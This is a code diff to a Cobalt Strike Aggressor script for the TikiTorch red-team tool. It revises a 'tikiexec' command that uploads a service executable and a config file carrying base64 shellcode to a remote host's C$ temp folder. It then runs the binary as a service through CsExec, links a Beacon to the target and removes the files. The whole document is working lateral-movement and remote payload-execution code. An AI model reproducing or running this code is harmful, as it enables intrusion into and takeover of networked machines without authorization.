@@ -1,3 +1,26 @@
+global('$CsExec::AssemblyPath');
+global('$TikiService::AssemblyPath');
+global('$TikiService::ConfigPath');
+
+$CsExec::AssemblyPath = "D:\\Tools\\MiscTools\\CsExec\\bin\\Release\\CsExec.exe";
+$TikiService::AssemblyPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe";
+$TikiService::ConfigPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe.config";
+
+if(!-exists $CsExec::AssemblyPath) {
+    show_error("CsExec assembly not found!");
+    exit();
+}
+
+if(!-exists $TikiService::AssemblyPath) {
+    show_error("TikiService assembly not found!");
+    exit();
+}
+
+if(!-exists $TikiService::ConfigPath) {
+    show_error("TikiService config not found!");
+    exit();
+}
+
 alias tikilateral {
 	
 	$bid = $1;
@@ -154,11 +177,6 @@ alias tikiexec {
 
 	}
 
-	println("[DEBUG] target: " . $target);
-	println("[DEBUG] listener: " . $listener);
-	println("[DEBUG] arch: " . $arch);
-	println("[DEBUG] binary: " . $binary);
-
 	############
 	## Errors ##
 	############
@@ -183,69 +201,34 @@ alias tikiexec {
 	yield;
 	$shellcode = base64_encode($1);
 
-	##################
-	## Prep Payload ##
-	##################
+	################
+	## Prep Files ##
+	################
 
-	$tikiService = getFileProper(script_resource("Templates"), "TikiService.exe");
-	$appConfig = getFileProper(script_resource("Templates"), "TikiService.exe.config");
-	println("[DEBUG] tikiService: " . $tikiService);
-	println("[DEBUG] appConfig: " . $appConfig);
-	
-	$handle = openf($tikiService);
+	$handle = openf($TikiService::AssemblyPath);
 	$exe = readb($handle, -1);
 	closef($handle);
 
-	$config = tikiexec_data_swap($binary, $shellcode, $appConfig);
-
-	##################
-	## Gen Filename ##
-	##################
-
-	@characters = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
-
-	$filename = "";
-
-	for ($i = 0; $i < 9; $i++) {
-		$filename = $filename . rand(@characters);
-	}
-
-	println("[DEBUG] filename: " . $filename);
+	$config = tikiexec_data_swap($binary, $shellcode, $TikiService::ConfigPath);
 
 	####################
 	## Upload and Run ##
 	####################
 
-	$binaryName = $filename . ".exe";
-	$configName = $filename . ".exe.config";
-	println("[DEBUG] binaryName: " . $binaryName);
-	println("[DEBUG] configName: " . $configName);
+	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe", $exe);
+	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe.config", $config);
 
-	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $binaryName $+ ", $exe);
-	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $configName $+ ", $config);
+	bexecute_assembly!($bid, $CsExec::AssemblyPath, " $+ $target $+  TikiSvc \"Tiki Service\" c:\\windows\\temp\\tikiservice.exe");
 
-	$create = "sc \\\\ $+ $target $+  create  $+ $filename $+  binPath= C:\\Windows\\Temp\\ $+ $binaryName $+ ";
-	$start = "sc \\\\ $+ $target $+  start  $+ $filename $+ ";
-	$stop = "sc \\\\ $+ $target $+  stop  $+ $filename $+ ";
-	$delete = "sc \\\\ $+ $target $+  delete  $+ $filename $+ ";
-	println("[DEBUG] create: " . $create);
-	println("[DEBUG] start: " . $start);
-	println("[DEBUG] stop: " . $stop);
-	println("[DEBUG] delete: " . $delete);
-
-	brun!($bid, $create);
-	brun!($bid, $start);
-	bpause!($bid, 3000);
+	bpause!($bid, 1000);
 	blink!($bid, $target);
-	brun!($bid, $stop);
-	brun!($bid, $delete);
 	
 	##################
 	## Remove Files ##
 	##################
 
-	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $binaryName $+ ");
-	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $configName $+ ");
+	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe");
+	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikiservice.exe.config");
 }
 
 sub tikiexec_data_swap {
